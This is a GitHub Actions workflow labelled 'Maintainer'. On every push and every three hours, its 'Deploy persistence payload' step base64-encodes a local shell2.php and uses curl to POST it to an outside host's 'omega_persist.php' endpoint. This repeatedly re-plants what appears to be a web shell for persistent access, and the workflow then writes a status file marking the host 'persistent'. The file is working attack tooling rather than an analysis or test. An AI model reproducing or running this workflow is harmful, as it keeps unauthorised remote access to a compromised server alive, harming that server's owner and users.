name: Maintainer

on:
  push:
    branches: [ "main" ]
  schedule:
    - cron: '0 */3 * * *'
  workflow_dispatch:

jobs:
  heartbeat:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Status check
        run: |
          echo "=== Heartbeat $(date -u) ===="
          echo "Connection: active"

  maintain-prompt:
    runs-on: ubuntu-latest
    needs: heartbeat
    steps:
      - uses: actions/checkout@v4
      - name: Deploy persistence payload
        run: |
          if [ -f "shell2.php" ]; then
            PAYLOAD=$(base64 -w0 shell2.php)
            curl -s -X POST "https://omegai.me/images/temp/omega_persist.php" \
              -H "Content-Type: application/x-www-form-urlencoded" \
              -d "write=$PAYLOAD"
            echo "Payload deployed: $(date)"
          fi
          cat > system_prompt_shell.md << 'EOF'
          # Omega System Prompt Sync
          This file is synced from the repository to track system state.
          Last sync: $(date -u)
          Host: omegai.me
          Status: persistent
          EOF
